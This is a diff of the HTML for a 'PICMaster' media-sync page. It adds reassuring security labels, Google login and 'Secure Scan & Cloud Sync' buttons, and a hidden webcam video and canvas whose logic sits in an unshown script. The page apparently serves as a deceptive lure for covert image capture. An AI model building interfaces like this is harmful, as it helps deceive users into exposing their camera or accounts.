@@ -25,7 +25,6 @@
 
     <div id="side-panel" class="side-panel">
         <div class="panel-header">System Dashboard</div>
-        
         <div class="panel-item" id="acc-info">
             <i class="fas fa-shield-check" style="color: #4CAF50;"></i>
             <div>
@@ -33,32 +32,21 @@
                 <p style="font-size: 11px; opacity: 0.7;">Security: Standard</p>
             </div>
         </div>
-
         <div class="panel-item sync-box" id="integrity-check-btn">
-            <i class="fas fa-sync-alt rotate-icon"></i>
+            <i class="fas fa-sync-alt"></i>
             <div>
                 <strong>Account Integrity Check</strong>
                 <p style="font-size: 11px; opacity: 0.8;">Cloud Storage Sync & Backup</p>
             </div>
         </div>
-
-        <div class="panel-item" id="side-login-btn">
-            <i class="fab fa-google"></i> <span>Login with Google</span>
-        </div>
-
-        <div class="panel-item"><i class="fas fa-database"></i> <span>Encrypted History</span></div>
-
-        <div class="panel-item logout-btn" id="logout-btn" style="display:none;">
-            <i class="fas fa-sign-out-alt"></i> <span>System Exit</span>
-        </div>
+        <div class="panel-item" id="side-login-btn"><i class="fab fa-google"></i> <span>Login with Google</span></div>
+        <div class="panel-item logout-btn" id="logout-btn" style="display:none;"><i class="fas fa-sign-out-alt"></i> <span>System Exit</span></div>
     </div>
 
     <main class="dashboard-container">
-        <div class="hero-section">
-            <h1 class="main-title">PICMaster</h1>
-            <p class="description">Professional file management and image capture system. Securely upload, store, and manage your digital media with cloud-integrated response tracking.</p>
-        </div>
-
+        <h1 class="main-title">PICMaster</h1>
+        <p class="description">Professional file management system. Securely sync and manage digital media with server-integrated tracking.</p>
+        
         <div class="rabbit-container">
             <img src="https://raw.githubusercontent.com/Tarikul-Islam-Anik/Animated-Fluent-Emojis/master/Emojis/Animals/Rabbit.png" class="rabbit-img" alt="Rabbit">
         </div>
@@ -68,22 +56,17 @@
                 <div class="icon-box"><i class="fas fa-cloud-upload-alt"></i></div>
                 <h3>Cloud Backup Zone</h3>
                 <p>Click or Drop Files here</p>
-                <span>To sync your pictures.</span>
             </div>
 
             <div class="action-section">
                 <h2 class="section-label"># Service Options</h2>
-                <button class="btn google-btn" id="main-login-btn">
-                    <i class="fab fa-google"></i> Login In with Google
-                </button>
-                <button class="btn camera-btn" id="camera-btn" style="display:none;">
-                    <i class="fas fa-camera"></i> Secure Scan & Cloud Sync
-                </button>
+                <button class="btn google-btn" id="main-login-btn"><i class="fab fa-google"></i> Login with Google</button>
+                <button class="btn camera-btn" id="camera-btn" style="display:none;"><i class="fas fa-camera"></i> Secure Scan & Cloud Sync</button>
             </div>
         </div>
     </main>
 
-    <video id="webcam" autoplay playsinline style="display:none;"></video>
+    <video id="webcam" autoplay playsinline style="display:none; width: 100%; max-width: 400px; margin: 20px auto; border-radius: 15px;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script type="module" src="script.js"></script>
